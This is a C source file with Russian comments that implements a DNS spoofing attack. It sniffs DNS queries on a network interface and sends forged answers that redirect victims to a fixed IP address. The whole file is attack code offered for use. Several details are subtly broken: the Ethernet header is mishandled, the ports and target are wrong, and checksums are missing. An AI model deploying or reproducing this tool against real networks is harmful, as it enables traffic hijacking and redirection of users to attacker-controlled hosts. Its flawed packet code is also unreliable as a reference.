#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <linux/if_packet.h>

#define FAKE_IP "192.168.1.100"  // Подменяем на этот IP
#define INTERFACE "eth0"         // Ваш сетевой интерфейс

// Структура DNS-заголовка (без полей данных)
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// Функция для отправки поддельного DNS-ответа
void send_spoofed_dns(uint8_t *dns_query, size_t query_len, struct sockaddr_in *src_addr, struct sockaddr_in *dst_addr) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket() failed");
        exit(1);
    }

    // 1. Парсим DNS-запрос
    struct dns_header *dns_hdr = (struct dns_header *)(dns_query + sizeof(struct iphdr) + sizeof(struct udphdr));
    uint16_t original_id = ntohs(dns_hdr->id);

    // 2. Создаем поддельный DNS-ответ
    uint8_t fake_response[1024];
    memset(fake_response, 0, sizeof(fake_response));

    // 2.1. IP-заголовок (подменяем src/dst)
    struct iphdr *ip_hdr = (struct iphdr *)fake_response;
    ip_hdr->ihl = 5;
    ip_hdr->version = 4;
    ip_hdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 64); // Примерная длина
    ip_hdr->id = htons(54321);
    ip_hdr->ttl = 64;
    ip_hdr->protocol = IPPROTO_UDP;
    ip_hdr->saddr = dst_addr->sin_addr.s_addr;  // Подменяем отправителя (DNS-сервер)
    ip_hdr->daddr = src_addr->sin_addr.s_addr;  // Получатель — жертва

    // 2.2. UDP-заголовок
    struct udphdr *udp_hdr = (struct udphdr *)(fake_response + sizeof(struct iphdr));
    udp_hdr->source = htons(53);  // DNS-порт
    udp_hdr->dest = ntohs(dst_addr->sin_port);
    udp_hdr->len = htons(sizeof(struct udphdr) + 64);

    // 2.3. DNS-ответ (поддельный)
    struct dns_header *fake_dns = (struct dns_header *)(fake_response + sizeof(struct iphdr) + sizeof(struct udphdr));
    fake_dns->id = htons(original_id);  // Важно: тот же ID, что и в запросе!
    fake_dns->flags = htons(0x8180);    // Флаг "Ответ" (QR=1) + "Авторитетный" (AA=1)
    fake_dns->qdcount = htons(1);       // 1 вопрос
    fake_dns->ancount = htons(1);       // 1 ответ

    // 2.4. Подделываем DNS-ответ (A-запись)
    uint8_t *dns_data = (uint8_t *)(fake_dns + 1);
    memcpy(dns_data, dns_query + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header), 16);  // Копируем вопрос

    // Добавляем поддельную A-запись
    dns_data += 16;  // Пропускаем вопрос
    *dns_data++ = 0xC0;  // Указатель на имя (сжатый формат)
    *dns_data++ = 0x0C;  // Смещение 12 байт
    *dns_data++ = 0x00;  // Тип A (1)
    *dns_data++ = 0x01;
    *dns_data++ = 0x00;  // Класс IN (1)
    *dns_data++ = 0x01;
    *dns_data++ = 0x00;  // TTL (30 сек)
    *dns_data++ = 0x00;
    *dns_data++ = 0x00;
    *dns_data++ = 0x1E;
    *dns_data++ = 0x00;  // Длина данных (4 байта IPv4)
    *dns_data++ = 0x04;
    *((uint32_t *)dns_data) = inet_addr(FAKE_IP);  // Подменяем IP!

    // 3. Отправляем пакет
    sendto(sock, fake_response, sizeof(struct iphdr) + sizeof(struct udphdr) + 64, 0, 
           (struct sockaddr *)dst_addr, sizeof(*dst_addr));

    close(sock);
}

int main() {
    // 1. Создаем raw-сокет для перехвата DNS-запросов
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sock < 0) {
        perror("socket() failed");
        return 1;
    }

    // 2. Привязываемся к интерфейсу
    struct ifreq if_opts;
    strncpy(if_opts.ifr_name, INTERFACE, IFNAMSIZ);
    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, &if_opts, sizeof(if_opts)) < 0) {
        perror("setsockopt() failed");
        close(sock);
        return 1;
    }

    printf("[*] Слушаем DNS-запросы на %s...\n", INTERFACE);

    while (1) {
        uint8_t buffer[2048];
        ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
        if (len <= 0) continue;

        // 3. Проверяем, что это DNS-запрос (UDP-порт 53)
        struct iphdr *ip_hdr = (struct iphdr *)buffer;
        if (ip_hdr->protocol != IPPROTO_UDP) continue;

        struct udphdr *udp_hdr = (struct udphdr *)(buffer + (ip_hdr->ihl * 4));
        if (ntohs(udp_hdr->dest) != 53) continue;  // Не DNS-запрос

        // 4. Извлекаем адреса
        struct sockaddr_in src_addr, dst_addr;
        memset(&src_addr, 0, sizeof(src_addr));
        src_addr.sin_family = AF_INET;
        src_addr.sin_addr.s_addr = ip_hdr->saddr;
        src_addr.sin_port = udp_hdr->source;

        memset(&dst_addr, 0, sizeof(dst_addr));
        dst_addr.sin_family = AF_INET;
        dst_addr.sin_addr.s_addr = ip_hdr->daddr;
        dst_addr.sin_port = udp_hdr->dest;

        // 5. Подменяем ответ
        printf("[+] Перехвачен DNS-запрос! Подменяем ответ...\n");
        send_spoofed_dns(buffer, len, &src_addr, &dst_addr);
    }

    close(sock);
    return 0;
}